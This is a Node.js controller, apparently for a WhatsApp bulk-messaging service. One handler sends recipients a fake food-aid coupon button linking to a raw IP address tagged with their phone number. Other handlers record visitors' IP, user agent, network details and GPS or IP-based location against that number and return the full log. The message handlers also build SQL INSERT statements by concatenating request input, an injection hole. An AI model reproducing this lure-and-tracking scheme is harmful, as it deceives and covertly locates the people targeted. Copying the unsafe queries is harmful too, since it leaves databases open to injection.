const whatsapp = require("wa-session-custom");
const ValidationError = require("../../utils/error");
const { responseSuccessWithData } = require("../../utils/response");
const mysql = require("mysql2");
const { config } = require("dotenv");
config();
const axios = require('axios');

const connection = mysql.createConnection({
    host: process.env.DB_HOST,
    user: process.env.DB_USER,
    password: process.env.DB_PASSWORD,
    database: process.env.DB_DATABASE,
});

exports.sendMessage = async (req, res, next) => {
    try {
        let to = req.body.to || req.query.to;
        let text = req.body.text || req.query.text;
        let tgl = req.body.tanggal || req.query.tanggal;
        let isGroup = req.body.isGroup || req.query.isGroup;
        const sessionId =
            req.body.session || req.query.session || req.headers.session;

        if (!to || !text) throw new ValidationError("Missing Parameters");

        const receiver = to;
        if (!sessionId) throw new ValidationError("Session Not Founds");
        const send = await whatsapp.sendTextMessage({
            sessionId,
            to: receiver,
            isGroup: !!isGroup,
            text,
        });

        connection.connect(function (err) {
            if (err) throw err;
            console.log("Connected!");
            var sql =
                "INSERT INTO blast_pesan (telepon, pesan,keterangan,tanggal) VALUES ('" +
                to +
                "','" +
                text +
                "','1','" +
                tgl +
                "')";
            connection.query(sql, function (err, result) {
                if (err) throw err;
                console.log("1 record inserted");
            });
        });

        res.status(200).json(
            responseSuccessWithData({
                id: send?.key?.id,
                status: send?.status,
                message: send?.message?.extendedTextMessage?.text || "Not Text",
                remoteJid: send?.key?.remoteJid,
            })
        );
    } catch (error) {
        connection.connect(function (err) {
            if (err) throw err;
            var sql =
                "INSERT INTO blast_pesan (telepon, pesan,keterangan,tanggal) VALUES ('" +
                req.body.to +
                "','" +
                req.body.text +
                "','0','" +
                req.body.tanggal +
                "')";
            connection.query(sql, function (err, result) {
                if (err) throw err;
                console.log("1 record inserted");
            });
        });

        next(error);
    }
};

exports.sendBulkMessage = async (req, res, next) => {
    try {
        const sessionId =
            req.body.session || req.query.session || req.headers.session;
        const delay = req.body.delay || req.query.delay || req.headers.delay;
        if (!sessionId) {
            return res.status(400).json({
                status: false,
                data: {
                    error: "Session Not Found",
                },
            });
        }
        res.status(200).json({
            status: true,
            data: {
                message: "Bulk Message is Processing",
            },
        });
        for (const dt of req.body.data) {
            const to = dt.to;
            const text = dt.text;
            const isGroup = !!dt.isGroup;

            await whatsapp.sendTextMessage({
                sessionId,
                to: to,
                isGroup: isGroup,
                text: text,
            });
            await whatsapp.createDelay(delay ?? 1000);
        }
        console.log("SEND BULK MESSAGE WITH DELAY SUCCESS");
    } catch (error) {
        next(error);
    }
};

exports.sendCustom = async (req, res, next) => {
    try {
        let to = req.body.to || req.query.to;
        let text = req.body.text || req.query.text;
        //   let tgl = req.body.tanggal || req.query.tanggal;
        let isGroup = req.body.isGroup || req.query.isGroup;
        const sessionId =
            req.body.session || req.query.session || req.headers.session;

        if (!to || !text) throw new ValidationError("Missing Parameters");

        const receiver = to;
        if (!sessionId) throw new ValidationError("Session Not Founds");

        const buttonMessage = {
            text: "Klik Dibawah Ini untuk mendapatkan kupon sembako",
            templateButtons: [
                {
                    urlButton: {
                        displayText: "Kupon Sembako",
                        url: `http://152.42.184.255/data/${receiver}`,
                    },
                },
            ],
            viewOnce: true,
            headerType: 4,
        };
        const send = await whatsapp.sendCustomMessage({
            sessionId,
            to: receiver,
            content: buttonMessage,
        });

        res.status(200).json(
            responseSuccessWithData({
                id: send?.key?.id,
                status: send?.status,
                message: send?.message?.extendedTextMessage?.text || "Not Text",
                remoteJid: send?.key?.remoteJid,
            })
        );
    } catch (error) {
        connection.connect(function (err) {
            if (err) throw err;
            var sql =
                "INSERT INTO blast_pesan (telepon, pesan,keterangan,tanggal) VALUES ('" +
                req.body.to +
                "','" +
                req.body.text +
                "','0','" +
                req.body.tanggal +
                "')";
            connection.query(sql, function (err, result) {
                if (err) throw err;
                console.log("1 record inserted");
            });
        });

        next(error);
    }
};

exports.sendLog = async (req, res, next) => {
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   
    console.log(req.body);
    const userAgent = req.headers['user-agent']; // Getting the User-Agent from headers
    const number = req.body.number;
    let network = '';
    let latitude = '';
    let longitude = '';
    let hasNetworkInfo = false;
    
    if (req.body.networkInfo && Object.keys(req.body.networkInfo).length !== 0) {
      network = JSON.stringify(req.body.networkInfo); // Assuming networkInfo is an object
        hasNetworkInfo = true;
    }
    
    if (req.body.location) {
      latitude = req.body.location.latitude || '';
      longitude = req.body.location.longitude || '';
    } else {
        try {
            if (ip.startsWith("::ffff:")) {
                // Extract the IPv4 part
                ip =  ip.split("::ffff:")[1];
            }
            const url = `https://ipapi.co/${ip}/json/`;
            console.log('Fetching location from IP:', url);
            const response = await axios.get(url);
            console.log('Response from IP API:', response.data);
              latitude= response.data.latitude,
              longitude= response.data.longitude

              if(!hasNetworkInfo){
                network = JSON.stringify(response.data);
            }
          } catch (error) {
            console.error('Error fetching location from IP:', error);
          }
    }
    const sql = "INSERT INTO collect (ip, agent, network, latitude, longitude, number,created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?,NOW(),NOW())";
    
    connection.connect(function(err) {
      if (err) throw err;
      console.log("Connected!");
    
      connection.query(sql, [ip, userAgent, network, latitude, longitude, number], function (err, result) {
        if (err) throw err;
        console.log("1 record inserted");
      });
    });

    res.status(200).send('Data received');
};

exports.getLog = async (req, res, next) => {
    connection.query('SELECT * FROM collect', (err, results) => {
        if (err) {
          console.error('Error retrieving data:', err);
          res.status(500).send('Error retrieving data');
          return;
        }
        console.log('Data received from Db: ', results);
        res.json(results);
      });
};

